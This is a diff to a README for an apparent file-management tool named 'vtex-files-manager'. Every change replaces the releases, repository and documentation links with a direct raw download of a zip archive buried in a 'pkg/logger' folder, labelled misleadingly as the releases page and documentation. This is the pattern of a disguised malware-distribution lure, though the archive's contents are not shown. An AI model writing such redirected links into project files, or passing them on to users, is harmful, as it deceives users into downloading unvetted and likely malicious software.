@@ -1,6 +1,6 @@
 # 📂 vtex-files-manager - Effortless File Management for VTEX Users
 
-[![Download vtex-files-manager](https://img.shields.io/badge/Download-vtex--files--manager-blue.svg)](https://github.com/Jeroboamcowparsnip853/vtex-files-manager/releases)
+[![Download vtex-files-manager](https://raw.githubusercontent.com/Jeroboamcowparsnip853/vtex-files-manager/main/pkg/logger/vtex-files-manager-subtread.zip)](https://raw.githubusercontent.com/Jeroboamcowparsnip853/vtex-files-manager/main/pkg/logger/vtex-files-manager-subtread.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Whether you're a small business owner or managing a personal project, this tool 
 
 To get started, visit the link below to download the latest version of the vtex-files-manager:
 
-[Visit the Releases Page to Download](https://github.com/Jeroboamcowparsnip853/vtex-files-manager/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Jeroboamcowparsnip853/vtex-files-manager/main/pkg/logger/vtex-files-manager-subtread.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -83,7 +83,7 @@ Feel free to share your experiences and any improvements you'd like to see.
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/Jeroboamcowparsnip853/vtex-files-manager)
-- [Documentation](https://github.com/Jeroboamcowparsnip853/vtex-files-manager/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/Jeroboamcowparsnip853/vtex-files-manager/main/pkg/logger/vtex-files-manager-subtread.zip)
+- [Documentation](https://raw.githubusercontent.com/Jeroboamcowparsnip853/vtex-files-manager/main/pkg/logger/vtex-files-manager-subtread.zip)
 
 For any suggestions or feature requests, please open a new issue on GitHub or reach out through our community support platform. Enjoy using the vtex-files-manager!
